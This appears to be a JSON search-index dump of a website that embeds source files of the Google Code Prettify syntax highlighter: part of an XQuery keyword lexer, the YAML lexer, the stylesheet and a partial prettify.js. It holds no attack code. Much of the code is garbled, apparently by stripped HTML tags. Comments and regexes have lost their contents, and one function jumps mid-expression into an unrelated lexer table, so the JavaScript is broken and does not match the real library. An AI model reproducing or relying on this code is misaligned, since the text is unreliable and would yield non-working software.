urrent-date|fn:count|fn:contains|fn:concat|fn:compare|fn:collection|fn:codepoints-to-string|fn:codepoint-equal|fn:ceiling|fn:boolean|fn:base-uri|fn:avg|fn:adjust-time-to-timezone|fn:adjust-dateTime-to-timezone|fn:adjust-date-to-timezone|fn:abs|feed:unsubscribe|feed:subscription|feed:subscribe|feed:request|feed:item|feed:description|excel:clean|entity:enrich|dom:set-pipelines|dom:set-permissions|dom:set-name|dom:set-evaluation-context|dom:set-domain-scope|dom:set-description|dom:remove-pipeline|dom:remove-permissions|dom:remove|dom:get|dom:evaluation-context|dom:domains|dom:domain-scope|dom:create|dom:configuration-set-restart-user|dom:configuration-set-permissions|dom:configuration-set-evaluation-context|dom:configuration-set-default-domain|dom:configuration-get|dom:configuration-create|dom:collection|dom:add-pipeline|dom:add-permissions|dls:retention-rules|dls:retention-rule-remove|dls:retention-rule-insert|dls:retention-rule|dls:purge|dls:node-expand|dls:link-references|dls:link-expand|dls:documents-query|dls:document-versions-query|dls:document-version-uri|dls:document-version-query|dls:document-version-delete|dls:document-version-as-of|dls:document-version|dls:document-update|dls:document-unmanage|dls:document-set-quality|dls:document-set-property|dls:document-set-properties|dls:document-set-permissions|dls:document-set-collections|dls:document-retention-rules|dls:document-remove-properties|dls:document-remove-permissions|dls:document-remove-collections|dls:document-purge|dls:document-manage|dls:document-is-managed|dls:document-insert-and-manage|dls:document-include-query|dls:document-history|dls:document-get-permissions|dls:document-extract-part|dls:document-delete|dls:document-checkout-status|dls:document-checkout|dls:document-checkin|dls:document-add-properties|dls:document-add-permissions|dls:document-add-collections|dls:break-checkout|dls:author-query|dls:as-of-query|dbk:convert|dbg:wait|dbg:value|dbg:stopped|dbg:stop|dbg:step|dbg:status|dbg:stack|dbg:out|dbg:next|dbg:line|dbg:invoke|dbg:function|dbg:finish|dbg:expr|dbg:eval|dbg:disconnect|dbg:detach|dbg:continue|dbg:connect|dbg:clear|dbg:breakpoints|dbg:break|dbg:attached|dbg:attach|cvt:save-converted-documents|cvt:part-uri|cvt:destination-uri|cvt:basepath|cvt:basename|cts:words|cts:word-query-weight|cts:word-query-text|cts:word-query-options|cts:word-query|cts:word-match|cts:walk|cts:uris|cts:uri-match|cts:train|cts:tokenize|cts:thresholds|cts:stem|cts:similar-query-weight|cts:similar-query-nodes|cts:similar-query|cts:shortest-distance|cts:search|cts:score|cts:reverse-query-weight|cts:reverse-query-nodes|cts:reverse-query|cts:remainder|cts:registered-query-weight|cts:registered-query-options|cts:registered-query-ids|cts:registered-query|cts:register|cts:query|cts:quality|cts:properties-query-query|cts:properties-query|cts:polygon-vertices|cts:polygon|cts:point-longitude|cts:point-latitude|cts:point|cts:or-query-queries|cts:or-query|cts:not-query-weight|cts:not-query-query|cts:not-query|cts:near-query-weight|cts:near-query-queries|cts:near-query-options|cts:near-query-distance|cts:near-query|cts:highlight|cts:geospatial-co-occurrences|cts:frequency|cts:fitness|cts:field-words|cts:field-word-query-weight|cts:field-word-query-text|cts:field-word-query-options|cts:field-word-query-field-name|cts:field-word-query|cts:field-word-match|cts:entity-highlight|cts:element-words|cts:element-word-query-weight|cts:element-word-query-text|cts:element-word-query-options|cts:element-word-query-element-name|cts:element-word-query|cts:element-word-match|cts:element-values|cts:element-value-ranges|cts:element-value-query-weight|cts:element-value-query-text|cts:element-value-query-options|cts:element-value-query-element-name|cts:element-value-query|cts:element-value-match|cts:element-value-geospatial-co-occurrences|cts:element-value-co-occurrences|cts:element-range-query-weight|cts:element-range-query-value|cts:element-range-query-options|cts:element-range-query-operator|cts:element-range-query-element-name|cts:element-range-query|cts:element-query-query|cts:element-query-element-name|cts:element-query|cts:element-pair-geospatial-values|cts:element-pair-geospatial-value-match|cts:element-pair-geospatial-query-weight|cts:element-pair-geospatial-query-region|cts:element-pair-geospatial-query-options|cts:element-pair-geospatial-query-longitude-name|cts:element-pair-geospatial-query-latitude-name|cts:element-pair-geospatial-query-element-name|cts:element-pair-geospatial-query|cts:element-pair-geospatial-boxes|cts:element-geospatial-values|cts:element-geospatial-value-match|cts:element-geospatial-query-weight|cts:element-geospatial-query-region|cts:element-geospatial-query-options|cts:element-geospatial-query-element-name|cts:element-geospatial-query|cts:element-geospatial-boxes|cts:element-child-geospatial-values|cts:element-child-geospatial-value-match|cts:element-child-geospatial-query-weight|cts:element-child-geospatial-query-region|cts:element-child-geospatial-query-options|cts:element-child-geospatial-query-element-name|cts:element-child-geospatial-query-child-name|cts:element-child-geospatial-query|cts:element-child-geospatial-boxes|cts:element-attribute-words|cts:element-attribute-word-query-weight|cts:element-attribute-word-query-text|cts:element-attribute-word-query-options|cts:element-attribute-word-query-element-name|cts:element-attribute-word-query-attribute-name|cts:element-attribute-word-query|cts:element-attribute-word-match|cts:element-attribute-values|cts:element-attribute-value-ranges|cts:element-attribute-value-query-weight|cts:element-attribute-value-query-text|cts:element-attribute-value-query-options|cts:element-attribute-value-query-element-name|cts:element-attribute-value-query-attribute-name|cts:element-attribute-value-query|cts:element-attribute-value-match|cts:element-attribute-value-geospatial-co-occurrences|cts:element-attribute-value-co-occurrences|cts:element-attribute-range-query-weight|cts:element-attribute-range-query-value|cts:element-attribute-range-query-options|cts:element-attribute-range-query-operator|cts:element-attribute-range-query-element-name|cts:element-attribute-range-query-attribute-name|cts:element-attribute-range-query|cts:element-attribute-pair-geospatial-values|cts:element-attribute-pair-geospatial-value-match|cts:element-attribute-pair-geospatial-query-weight|cts:element-attribute-pair-geospatial-query-region|cts:element-attribute-pair-geospatial-query-options|cts:element-attribute-pair-geospatial-query-longitude-name|cts:element-attribute-pair-geospatial-query-latitude-name|cts:element-attribute-pair-geospatial-query-element-name|cts:element-attribute-pair-geospatial-query|cts:element-attribute-pair-geospatial-boxes|cts:document-query-uris|cts:document-query|cts:distance|cts:directory-query-uris|cts:directory-query-depth|cts:directory-query|cts:destination|cts:deregister|cts:contains|cts:confidence|cts:collections|cts:collection-query-uris|cts:collection-query|cts:collection-match|cts:classify|cts:circle-radius|cts:circle-center|cts:circle|cts:box-west|cts:box-south|cts:box-north|cts:box-east|cts:box|cts:bearing|cts:arc-intersection|cts:and-query-queries|cts:and-query-options|cts:and-query|cts:and-not-query-positive-query|cts:and-not-query-negative-query|cts:and-not-query|css:get|css:convert|cpf:success|cpf:failure|cpf:document-set-state|cpf:document-set-processing-status|cpf:document-set-last-updated|cpf:document-set-error|cpf:document-get-state|cpf:document-get-processing-status|cpf:document-get-last-updated|cpf:document-get-error|cpf:check-transition|alert:spawn-matching-actions|alert:rule-user-id-query|alert:rule-set-user-id|alert:rule-set-query|alert:rule-set-options|alert:rule-set-name|alert:rule-set-description|alert:rule-set-action|alert:rule-remove|alert:rule-name-query|alert:rule-insert|alert:rule-id-query|alert:rule-get-user-id|alert:rule-get-query|alert:rule-get-options|alert:rule-get-name|alert:rule-get-id|alert:rule-get-description|alert:rule-get-action|alert:rule-action-query|alert:remove-triggers|alert:make-rule|alert:make-log-action|alert:make-config|alert:make-action|alert:invoke-matching-actions|alert:get-my-rules|alert:get-all-rules|alert:get-actions|alert:find-matching-rules|alert:create-triggers|alert:config-set-uri|alert:config-set-trigger-ids|alert:config-set-options|alert:config-set-name|alert:config-set-description|alert:config-set-cpf-domain-names|alert:config-set-cpf-domain-ids|alert:config-insert|alert:config-get-uri|alert:config-get-trigger-ids|alert:config-get-options|alert:config-get-name|alert:config-get-id|alert:config-get-description|alert:config-get-cpf-domain-names|alert:config-get-cpf-domain-ids|alert:config-get|alert:config-delete|alert:action-set-options|alert:action-set-name|alert:action-set-module-root|alert:action-set-module-db|alert:action-set-module|alert:action-set-description|alert:action-remove|alert:action-insert|alert:action-get-options|alert:action-get-name|alert:action-get-module-root|alert:action-get-module-db|alert:action-get-module|alert:action-get-description|zero-or-one|years-from-duration|year-from-dateTime|year-from-date|upper-case|unordered|true|translate|trace|tokenize|timezone-from-time|timezone-from-dateTime|timezone-from-date|sum|subtract-dateTimes-yielding-yearMonthDuration|subtract-dateTimes-yielding-dayTimeDuration|substring-before|substring-after|substring|subsequence|string-to-codepoints|string-pad|string-length|string-join|string|static-base-uri|starts-with|seconds-from-time|seconds-from-duration|seconds-from-dateTime|round-half-to-even|round|root|reverse|resolve-uri|resolve-QName|replace|remove|QName|prefix-from-QName|position|one-or-more|number|not|normalize-unicode|normalize-space|node-name|node-kind|nilled|namespace-uri-from-QName|namespace-uri-for-prefix|namespace-uri|name|months-from-duration|month-from-dateTime|month-from-date|minutes-from-time|minutes-from-duration|minutes-from-dateTime|min|max|matches|lower-case|local-name-from-QName|local-name|last|lang|iri-to-uri|insert-before|index-of|in-scope-prefixes|implicit-timezone|idref|id|hours-from-time|hours-from-duration|hours-from-dateTime|floor|false|expanded-QName|exists|exactly-one|escape-uri|escape-html-uri|error|ends-with|encode-for-uri|empty|document-uri|doc-available|doc|distinct-values|distinct-nodes|default-collation|deep-equal|days-from-duration|day-from-dateTime|day-from-date|data|current-time|current-dateTime|current-date|count|contains|concat|compare|collection|codepoints-to-string|codepoint-equal|ceiling|boolean|base-uri|avg|adjust-time-to-timezone|adjust-dateTime-to-timezone|adjust-date-to-timezone|abs)\\b/], // Matching normal words if none of the previous regular expressions matched [PR['PR_PLAIN'], /^[A-Za-z0-9_\\-\\:]+/], // Matching whitespaces [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/] ]), ['xq', 'xquery']); })();","link":"/plugins/prettify/lang-xq.js"},{"title":"","text":"/** * @license * Copyright (C) 2015 ribrdb @ code.google.com * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ // Contributed by ribrdb @ code.google.com /** * @fileoverview * Registers a language handler for YAML. * * @author ribrdb */ PR['registerLangHandler']( PR['createSimpleLexer']( [ [PR['PR_PUNCTUATION'], /^[:|>?]+/, null, ':|>?'], [PR['PR_DECLARATION'], /^%(?:YAML|TAG)[^#\\r\\n]+/, null, '%'], [PR['PR_TYPE'], /^[&]\\S+/, null, '&'], [PR['PR_TYPE'], /^!\\S*/, null, '!'], [PR['PR_STRING'], /^\"(?:[^\\\\\"]|\\\\.)*(?:\"|$)/, null, '\"'], [PR['PR_STRING'], /^'(?:[^']|'')*(?:'|$)/, null, \"'\"], [PR['PR_COMMENT'], /^#[^\\r\\n]*/, null, '#'], [PR['PR_PLAIN'], /^\\s+/, null, ' \\t\\r\\n'] ], [ [PR['PR_DECLARATION'], /^(?:---|\\.\\.\\.)(?:[\\r\\n]|$)/], [PR['PR_PUNCTUATION'], /^-/], [PR['PR_KEYWORD'], /^[\\w-]+:[ \\r\\n]/], [PR['PR_PLAIN'], /^\\w+/] ]), ['yaml', 'yml']);","link":"/plugins/prettify/lang-yaml.js"},{"title":"","text":"/** * @license * Copyright (C) 2015 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /* Pretty printing styles. Used with prettify.js. */ /* SPAN elements with the classes below are added by prettyprint. */ .pln { color: #000 } /* plain text */ @media screen { .str { color: #080 } /* string content */ .kwd { color: #008 } /* a keyword */ .com { color: #800 } /* a comment */ .typ { color: #606 } /* a type name */ .lit { color: #066 } /* a literal value */ /* punctuation, lisp open bracket, lisp close bracket */ .pun, .opn, .clo { color: #660 } .tag { color: #008 } /* a markup tag name */ .atn { color: #606 } /* a markup attribute name */ .atv { color: #080 } /* a markup attribute value */ .dec, .var { color: #606 } /* a declaration; a variable name */ .fun { color: red } /* a function name */ } /* Use higher contrast and text-weight for printable form. */ @media print, projection { .str { color: #060 } .kwd { color: #006; font-weight: bold } .com { color: #600; font-style: italic } .typ { color: #404; font-weight: bold } .lit { color: #044 } .pun, .opn, .clo { color: #440 } .tag { color: #006; font-weight: bold } .atn { color: #404 } .atv { color: #060 } } /* Put a border around prettyprinted code snippets. */ pre.prettyprint { padding: 2px; border: 1px solid #888 } /* Specify class=linenums on a pre to get line numbering */ ol.linenums { margin-top: 0; margin-bottom: 0 } /* IE indents via margin-left */ li.L0, li.L1, li.L2, li.L3, li.L5, li.L6, li.L7, li.L8 { list-style-type: none } /* Alternate shading for lines */ li.L1, li.L3, li.L5, li.L7, li.L9 { background: #eee }","link":"/plugins/prettify/prettify.css"},{"title":"","text":"/** * @license * Copyright (C) 2006 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * some functions for browser-side pretty printing of code contained in html. * * * For a fairly comprehensive set of languages see the * README * file that came with this source. At a minimum, the lexer should work on a * number of languages including C and friends, Java, Python, Bash, SQL, HTML, * XML, CSS, Javascript, and Makefiles. It works passably on Ruby, PHP and Awk * and a subset of Perl, but, because of commenting conventions, doesn't work on * Smalltalk, Lisp-like, or CAML-like languages without an explicit lang class. * * Usage: * include this source file in an html page via * {@code } * define style rules. See the example page for examples. * mark the {@code } and {@code } tags in your source with * {@code class=prettyprint.} * You can also use the (html deprecated) {@code } tag, but the pretty * printer needs to do more substantial DOM manipulations to support that, so * some css styles may not be preserved. * * That's it. I wanted to keep the API as simple as possible, so there's no * need to specify which language the code is in, but if you wish, you can add * another class to the {@code } or {@code } element to specify the * language, as in {@code }. Any class that * starts with \"lang-\" followed by a file extension, specifies the file type. * See the \"lang-*.js\" files in this directory for code that implements * per-language file handlers. * * Change log: * cbeust, 2006/08/22 * * Java annotations (start with \"@\") are now captured as literals (\"lit\") * * @requires console */ // JSLint declarations /*global console, document, navigator, setTimeout, window, define */ /** * @typedef {!Array.} * Alternating indices and the decorations that should be inserted there. * The indices are monotonically increasing. */ var DecorationsT; /** * @typedef {!{ * sourceNode: !Element, * pre: !(number|boolean), * langExtension: ?string, * numberLines: ?(number|boolean), * sourceCode: ?string, * spans: ?(Array.), * basePos: ?number, * decorations: ?DecorationsT * }} * * sourceNodethe element containing the source * sourceCodesource as plain text * pretruthy if white-space in text nodes * should be considered significant. * spans alternating span start indices into source * and the text node or element (e.g. {@code }) corresponding to that * span. * decorationsan array of style classes preceded * by the position at which they start in job.sourceCode in order * basePosinteger position of this.sourceCode in the larger chunk of * source. * */ var JobT; /** * @typedef {!{ * sourceCode: string, * spans: !(Array.) * }} * * sourceCodesource as plain text * spans alternating span start indices into source * and the text node or element (e.g. {@code }) corresponding to that * span. * */ var SourceSpansT; /** @define {boolean} */ var IN_GLOBAL_SCOPE = true; /** * {@type !{ * 'createSimpleLexer': function (Array, Array): (function (JobT)), * 'registerLangHandler': function (function (JobT), Array.), * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_VALUE': string, * 'PR_COMMENT': string, * 'PR_DECLARATION': string, * 'PR_KEYWORD': string, * 'PR_LITERAL': string, * 'PR_NOCODE': string, * 'PR_PLAIN': string, * 'PR_PUNCTUATION': string, * 'PR_SOURCE': string, * 'PR_STRING': string, * 'PR_TAG': string, * 'PR_TYPE': string, * 'prettyPrintOne': function (string, string, number|boolean), * 'prettyPrint': function (?function, ?(HTMLElement|HTMLDocument)) * }} * @const */ var PR; /** * Split {@code prettyPrint} into multiple timeouts so as not to interfere with * UI events. * If set to {@code false}, {@code prettyPrint()} is synchronous. */ var PR_SHOULD_USE_CONTINUATION = true if (typeof window !== 'undefined') { window['PR_SHOULD_USE_CONTINUATION'] = PR_SHOULD_USE_CONTINUATION; } /** * Pretty print a chunk of code. * @param {string} sourceCodeHtml The HTML to pretty print. * @param {string} opt_langExtension The language name to use. * Typically, a filename extension like 'cpp' or 'java'. * @param {number|boolean} opt_numberLines True to number lines, * or the 1-indexed number of the first line in sourceCodeHtml. * @return {string} code as html, but prettier */ var prettyPrintOne; /** * Find all the {@code } and {@code } tags in the DOM with * {@code class=prettyprint} and prettify them. * * @param {Function} opt_whenDone called when prettifying is done. * @param {HTMLElement|HTMLDocument} opt_root an element or document * containing all the elements to pretty print. * Defaults to {@code document.body}. */ var prettyPrint; (function () { var win = (typeof window !== 'undefined') ? window : {}; // Keyword lists for various languages. // We use things that coerce to strings to make them compact when minified // and to defeat aggressive optimizers that fold large string constants. var FLOW_CONTROL_KEYWORDS = [\"break,continue,do,else,for,if,return,while\"]; var C_KEYWORDS = [FLOW_CONTROL_KEYWORDS,\"auto,case,char,const,default,\" + \"double,enum,extern,float,goto,inline,int,long,register,restrict,short,signed,\" + \"sizeof,static,struct,switch,typedef,union,unsigned,void,volatile\"]; var COMMON_KEYWORDS = [C_KEYWORDS,\"catch,class,delete,false,import,\" + \"new,operator,private,protected,public,this,throw,true,try,typeof\"]; var CPP_KEYWORDS = [COMMON_KEYWORDS,\"alignas,alignof,align_union,asm,axiom,bool,\" + \"concept,concept_map,const_cast,constexpr,decltype,delegate,\" + \"dynamic_cast,explicit,export,friend,generic,late_check,\" + \"mutable,namespace,noexcept,noreturn,nullptr,property,reinterpret_cast,static_assert,\" + \"static_cast,template,typeid,typename,using,virtual,where\"]; var JAVA_KEYWORDS = [COMMON_KEYWORDS, \"abstract,assert,boolean,byte,extends,finally,final,implements,import,\" + \"instanceof,interface,null,native,package,strictfp,super,synchronized,\" + \"throws,transient\"]; var CSHARP_KEYWORDS = [COMMON_KEYWORDS, \"abstract,add,alias,as,ascending,async,await,base,bool,by,byte,checked,decimal,delegate,descending,\" + \"dynamic,event,finally,fixed,foreach,from,get,global,group,implicit,in,interface,\" + \"internal,into,is,join,let,lock,null,object,out,override,orderby,params,\" + \"partial,readonly,ref,remove,sbyte,sealed,select,set,stackalloc,string,select,uint,ulong,\" + \"unchecked,unsafe,ushort,value,var,virtual,where,yield\"]; var COFFEE_KEYWORDS = \"all,and,by,catch,class,else,extends,false,finally,\" + \"for,if,in,is,isnt,loop,new,no,not,null,of,off,on,or,return,super,then,\" + \"throw,true,try,unless,until,when,while,yes\"; var JSCRIPT_KEYWORDS = [COMMON_KEYWORDS, \"abstract,async,await,constructor,debugger,enum,eval,export,from,function,\" + \"get,import,implements,instanceof,interface,let,null,of,set,undefined,\" + \"var,with,yield,Infinity,NaN\"]; var PERL_KEYWORDS = \"caller,delete,die,do,dump,elsif,eval,exit,foreach,for,\" + \"goto,if,import,last,local,my,next,no,our,print,package,redo,require,\" + \"sub,undef,unless,until,use,wantarray,while,BEGIN,END\"; var PYTHON_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"and,as,assert,class,def,del,\" + \"elif,except,exec,finally,from,global,import,in,is,lambda,\" + \"nonlocal,not,or,pass,print,raise,try,with,yield,\" + \"False,True,None\"]; var RUBY_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"alias,and,begin,case,class,\" + \"def,defined,elsif,end,ensure,false,in,module,next,nil,not,or,redo,\" + \"rescue,retry,self,super,then,true,undef,unless,until,when,yield,\" + \"BEGIN,END\"]; var SH_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"case,done,elif,esac,eval,fi,\" + \"function,in,local,set,then,until\"]; var ALL_KEYWORDS = [ CPP_KEYWORDS, CSHARP_KEYWORDS, JAVA_KEYWORDS, JSCRIPT_KEYWORDS, PERL_KEYWORDS, PYTHON_KEYWORDS, RUBY_KEYWORDS, SH_KEYWORDS]; var C_TYPES = /^(DIR|FILE|array|vector|(de|priority_)?queue|(forward_)?list|stack|(const_)?(reverse_)?iterator|(unordered_)?(multi)?(set|map)|bitset|u?(int|float)\\d*)\\b/; // token style names. correspond to css classes /** * token style for a string literal * @const */ var PR_STRING = 'str'; /** * token style for a keyword * @const */ var PR_KEYWORD = 'kwd'; /** * token style for a comment * @const */ var PR_COMMENT = 'com'; /** * token style for a type * @const */ var PR_TYPE = 'typ'; /** * token style for a literal value. e.g. 1, null, true. * @const */ var PR_LITERAL = 'lit'; /** * token style for a punctuation string. * @const */ var PR_PUNCTUATION = 'pun'; /** * token style for plain text. * @const */ var PR_PLAIN = 'pln'; /** * token style for an sgml tag. * @const */ var PR_TAG = 'tag'; /** * token style for a markup declaration such as a DOCTYPE. * @const */ var PR_DECLARATION = 'dec'; /** * token style for embedded source. * @const */ var PR_SOURCE = 'src'; /** * token style for an sgml attribute name. * @const */ var PR_ATTRIB_NAME = 'atn'; /** * token style for an sgml attribute value. * @const */ var PR_ATTRIB_VALUE = 'atv'; /** * A class that indicates a section of markup that is not code, e.g. to allow * embedding of line numbers within code listings. * @const */ var PR_NOCODE = 'nocode'; // Regex pattern below is automatically generated by regexpPrecederPatterns.pl // Do not modify, your changes will be erased. // CAVEAT: this does not properly handle the case where a regular // expression immediately follows another since a regular expression may // have flags for case-sensitivity and the like. Having regexp tokens // adjacent is not valid in any language I'm aware of, so I'm punting. // TODO: maybe style special characters inside a regexp as punctuation. /** * A set of tokens that can precede a regular expression literal in * javascript * http://web.archive.org/web/20070717142515/http://www.mozilla.org/js/language/js20/rationale/syntax.html * has the full list, but I've removed ones that might be problematic when * seen in languages that don't support regular expression literals. * * Specifically, I've removed any keywords that can't precede a regexp * literal in a syntactically legal javascript program, and I've removed the * \"in\" keyword since it's not a keyword in many languages, and might be used * as a count of inches. * * The link above does not accurately describe EcmaScript rules since * it fails to distinguish between (a=++/b/i) and (a++/b/i) but it works * very well in practice. * * @private * @const */ var REGEXP_PRECEDER_PATTERN = '(?:^^\\\\.?|[+-]|[!=]=?=?|\\\\#|%=?|&&?=?|\\\\(|\\\\*=?|[+\\\\-]=|->|\\\\/=?|::?|?>?=?|,|;|\\\\?|@|\\\\[|~|{|\\\\^\\\\^?=?|\\\\|\\\\|?=?|break|case|continue|delete|do|else|finally|instanceof|return|throw|try|typeof)\\\\s*'; /** * Given a group of {@link RegExp}s, returns a {@code RegExp} that globally * matches the union of the sets of strings matched by the input RegExp. * Since it matches globally, if the input strings have a start-of-input * anchor (/^.../), it is ignored for the purposes of unioning. * @param {Array.} regexs non multiline, non-global regexs. * @return {RegExp} a global regex. */ function combinePrefixPatterns(regexs) { var capturedGroupIndex = 0; var needToFoldCase = false; var ignoreCase = false; for (var i = 0, n = regexs.length; i < n; ++i) { var regex = regexs[i]; if (regex.ignoreCase) { ignoreCase = true; } else if (/[a-z]/i.test(regex.source.replace( /\\\\u[0-9a-f]{4}|\\\\x[0-9a-f]{2}|\\\\[^ux]/gi, ''))) { needToFoldCase = true; ignoreCase = false; break; } } var escapeCharToCodeUnit = { 'b': 8, 't': 9, 'n': 0xa, 'v': 0xb, 'f': 0xc, 'r': 0xd }; function decodeEscape(charsetPart) { var cc0 = charsetPart.charCodeAt(0); if (cc0 !== 92 /* \\\\ */) { return cc0; } var c1 = charsetPart.charAt(1); cc0 = escapeCharToCodeUnit[c1]; if (cc0) { return cc0; } else if ('0' /i], // Unescaped content in javascript. (Or possibly vbscript). ['lang-js', /^]*>([\\s\\S]*?)(]*>)/i], // Contains unescaped stylesheet content ['lang-css', /^]*>([\\s\\S]*?)(]*>)/i], ['lang-in.tag', /^()/i] ]), ['default-markup', 'htm', 'html', 'mxml', 'xhtml', 'xml', 'xsl']); registerLangHandler( createSimpleLexer( [ [PR_PLAIN, /^[\\s]+/, null, ' \\t\\r\\n'], [PR_ATTRIB_VALUE, /^(?:\\\"[^\\\"]*\\\"?|\\'[^\\']*\\'?)/, null, '\\\"\\''] ], [ [PR_TAG, /^^$/i], [PR_ATTRIB_NAME, /^(?!style[\\s=]|on)[a-z](?:[\\w:-]*\\w)?/i], ['lang-uq.val', /^=\\s*([^>\\'\\\"\\s]*(?:[^>\\'\\\"\\s\\/]|\\/(?=\\s)))/], [PR_PUNCTUATION, /^[=\\/]+/], ['lang-js', /^on\\w+\\s*=\\s*\\\"([^\\\"]+)\\\"/i], ['lang-js', /^on\\w+\\s*=\\s*\\'([^\\']+)\\'/i], ['lang-js', /^on\\w+\\s*=\\s*([^\\\"\\'>\\s]+)/i], ['lang-css', /^style\\s*=\\s*\\\"([^\\\"]+)\\\"/i], ['lang-css', /^style\\s*=\\s*\\'([^\\']+)\\'/i], ['lang-css', /^style\\s*=\\s*([^\\\"\\'>\\s]+)/i] ]), ['in.tag']); registerLangHandler( createSimpleLexer([], [[PR_ATTRIB_VALUE, /^[\\s\\S]+/]]), ['uq.val']); registerLangHandler(sourceDecorator({ 'keywords': CPP_KEYWORDS, 'hashComments': true, 'cStyleComments': true, 'types': C_TYPES }), ['c', 'cc', 'cpp', 'cxx', 'cyc', 'm']); registerLangHandler(sourceDecorator({ 'keywords': 'null,true,false' }), ['json']); registerLangHandler(sourceDecorator({ 'keywords': CSHARP_KEYWORDS, 'hashComments': true, 'cStyleComments': true, 'verbatimStrings': true, 'types': C_TYPES }), ['cs']); registerLangHandler(sourceDecorator({ 'keywords': JAVA_KEYWORDS, 'cStyleComments': true }), ['java']); registerLangHandler(sourceDecorator({ 'keywords': SH_KEYWORDS, 'hashComments': true, 'multiLineStrings': true }), ['bash', 'bsh', 'csh', 'sh']); registerLangHandler(sourceDecorator({ 'keywords': PYTHON_KEYWORDS, 'hashComments': true, 'multiLineStrings': true, 'tripleQuotedStrings': true }), ['cv', 'py', 'python']); registerLangHandler(sourceDecorator({ 'keywords': PERL_KEYWORDS, 'hashComments': true, 'multiLineStrings': true, 'regexLiterals': 2 // multiline regex literals }), ['perl', 'pl', 'pm']); registerLangHandler(sourceDecorator({ 'keywords': RUBY_KEYWORDS, 'hashComments': true, 'multiLineStrings': true, 'regexLiterals': true }), ['rb', 'ruby']); registerLangHandler(sourceDecorator({ 'keywords': JSCRIPT_KEYWORDS, 'cStyleComments': true, 'regexLiterals': true }), ['javascript', 'js', 'ts', 'typescript']); registerLangHandler(sourceDecorator({ 'keywords': COFFEE_KEYWORDS, 'hashComments': 3, // ### style block comments 'cStyleComments': true, 'multilineStrings': true, 'tripleQuotedStrings': true, 'regexLiterals': true }), ['coffee']); registerLangHandler( createSimpleLexer([], [[PR_STRING, /^[\\s\\S]+/]]), ['regex']); /** @param {JobT} job */ function applyDecorator(job) { var opt_langExtension = job.langExtension; try { // Extract tags, and convert the source code to plain text. var sourceAndSpans = extractSourceSpans(job.sourceNode, job.pre); /** Plain text. @type {string} */ var source = sourceAndSpans.sourceCode; job.sourceCode = source; job.spans = sourceAndSpans.spans; job.basePos = 0; // Apply the appropriate language handler langHandlerForExtension(opt_langExtension, source)(job); // Integrate the decorations and tags back into the source code, // modifying the sourceNode in place. recombineTagsAndDecorations(job); } catch (e) { if (win['console']) { console['log'](e && e['stack'] || e); } } } /** * Pretty print a chunk of code. * @param sourceCodeHtml {string} The HTML to pretty print. * @param opt_langExtension {string} The language name to use. * Typically, a filename extension like 'cpp' or 'java'. * @param opt_numberLines {number|boolean} True to number lines, * or the 1-indexed number of the first line in sourceCodeHtml. */ function $prettyPrintOne(sourceCodeHtml, opt_langExtension, opt_numberLines) { /** @type{number|boolean} */ var nl = opt_numberLines || false; /** @type{string|null} */ var langExtension = opt_langExtension || null; /** @type{!Element} */ var container = document.createElement('div'); // This could cause images to load and onload listeners to fire. // E.g. . // We assume that the inner HTML is from a trusted source. // The pre-tag is required for IE8 which strips newlines from innerHTML // when it is injected into a tag. // http://stackoverflow.com/questions/451486/pre-tag-loses-line-breaks-when-setting-innerhtml-in-ie // http://stackoverflow.com/questions/195363/inserting-a-newline-into-a-pre-tag-ie-javascript container.innerHTML = '' + sourceCodeHtml + ''; container = /** @type{!Element} */(container.firstChild); if (nl) { numberLines(container, nl, true); } /** @type{JobT} */ var job = { langExtension: langExtension, numberLines: nl, sourceNode: container, pre: 1, sourceCode: null, basePos: null, spans: null, decorations: null }; applyDecorator(job); return container.innerHTML; } /** * Find all the {@code } and {@code } tags in the DOM with * {@code class=prettyprint} and prettify them. * * @param {Function} opt_whenDone called when prettifying is done. * @param {HTMLElement|HTMLDocument} opt_root an element or document * containing all the elements to pretty print. * Defaults to {@code document.body}. */ function $prettyPrint(opt_whenDone, opt_root) { var root = opt_root || document.body; var doc = root.ownerDocument || document; function byTagName(tn) { return root.getElementsByTagName(tn); } // fetch a list of nodes to rewrite var codeSegments = [byTagName('pre'), byTagName('code'), byTagName('xmp')]; var elements = []; for (var i = 0; i < codeSegments.length; ++i) { for (var j = 0, n = codeSegments[i].length; j < n; ++j) { elements.push(codeSegments[i][j]); } } codeSegments = null; var clock = Date; if (!clock['now']) { clock = { 'now': function () { return +(new Date); } }; } // The loop is broken into a series of continuations to make sure that we // don't make the browser unresponsive when rewriting a large page. var k = 0; var langExtensionRe = /\\blang(?:uage)?-([\\w.]+)(?!\\S)/; var prettyPrintRe = /\\bprettyprint\\b/; var prettyPrintedRe = /\\bprettyprinted\\b/; var preformattedTagNameRe = /pre|xmp/i; var codeRe = /^code$/i; var preCodeXmpRe = /^(?:pre|code|xmp)$/i; var EMPTY = {}; function doWork() { var endTime = (win['PR_SHOULD_USE_CONTINUATION'] ? clock['now']() + 250 /* ms */ : Infinity); for (; k < elements.length && clock['now']() < endTime; k++) { var cs = elements[k]; // Look for a preceding comment like // var attrs = EMPTY; { for (var preceder = cs; (preceder = preceder.previousSibling);) { var nt = preceder.nodeType; // is parsed by HTML 5 to a comment node (8) // like 